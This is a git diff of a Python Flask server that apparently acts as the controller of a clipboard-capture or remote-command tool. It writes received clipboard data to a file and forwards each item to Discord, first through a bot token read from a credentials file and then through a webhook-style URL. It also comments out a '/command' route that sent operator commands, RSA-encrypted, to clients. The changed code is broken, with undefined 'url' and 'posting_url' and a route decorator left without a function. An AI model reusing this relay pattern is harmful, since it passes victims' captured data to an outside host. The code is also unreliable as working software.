@@ -42,17 +42,22 @@ def get_output():
     server_clipboard_file.write(s + '\n')
 
     #from PDM project
-    values = list()
-    with open("credentials", "r") as f:
-        values.append(f.readline().split('=')[1].strip())
-        values.append(f.readline().split('=')[1].strip())
+    #values = list()
+    #with open("credentials", "r") as f:
+        #values.append(f.readline().split('=')[1].strip())
+        #values.append(f.readline().split('=')[1].strip())
+    #    values.append(f.readline().split('=')[1].strip())
 
     #TODO: make sure whenever I am running the server script that it has access to the credentials
-    token = values[0]
-    channel_id = values[1]
+    #token = values[0]
+    #channel_id = values[1]
+
+    #url = secret
+    #values[0]
     message = s
 
-    message_post(token, channel_id, message)
+    #put url here
+    message_post(message, url)
 
     #post returns something so we return a random int between 1 and 1000
     s = random.randint(1, 1000)
@@ -65,16 +70,24 @@ def show_when_connected():
     print(s)
 
 
-    values = list()
-    with open("credentials", "r") as f:
-        values.append(f.readline().split('=')[1].strip())
-        values.append(f.readline().split('=')[1].strip())
+    #values = list()
+    #with open("credentials", "r") as f:
+        #values.append(f.readline().split('=')[1].strip())
+        #values.append(f.readline().split('=')[1].strip())
+        #values.append(f.readline().split('=')[1].strip())
 
     #TODO: make sure whenever I am running the server script that it has access to the credentials
-    token = values[0]
-    channel_id = values[1]
+    #token = values[0]
+    #channel_id = values[1]
+
+    #posting_url = SECRET
+
+    #values[0]
     message = s
-    message_post(token, channel_id, message)
+    message_post(message, posting_url)
+
+
+
 
     # post returns something so we return a random int between 1 and 1000
     s = random.randint(1, 1000)
@@ -89,29 +102,25 @@ def show_when_connected():
 #TODO encrypt the traffic
 #TODO: add variable time limits
 @app.route("/command", methods=["GET"])
-def command():
-    command_input = input("Enter any command you want. Enter No for no command to be run: ")
-    encrypted_command = rsa.encrypt(command_input.encode(),public_key_for_commands)
-    return encrypted_command
+#def command():
+    #command_input = input("Enter any command you want. Enter No for no command to be run: ")
+    #encrypted_command = rsa.encrypt(command_input.encode(),public_key_for_commands)
+    #return encrypted_command
 
 
 
 #https://blog.apify.com/python-discord-api/
-def message_post(token, channel_id, message):
-    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-
-    headers = {
-        "Authorization": f"{token}",
-    }
+def message_post(message, url):
 
     data = {
         "content": message
     }
 
-    response = requests.post(url, headers=headers, json=data)
+    #stop trying if 15 seconds and was not successful
+    response = requests.post(url, json=data, timeout=15)
 
 def main():
-    #Starts a server on the local host on port 12345
-    app.run(host="127.0.0.1", port=80)
 
+    #ip address goes here
+    app.run("127.0.0.1")
 main()
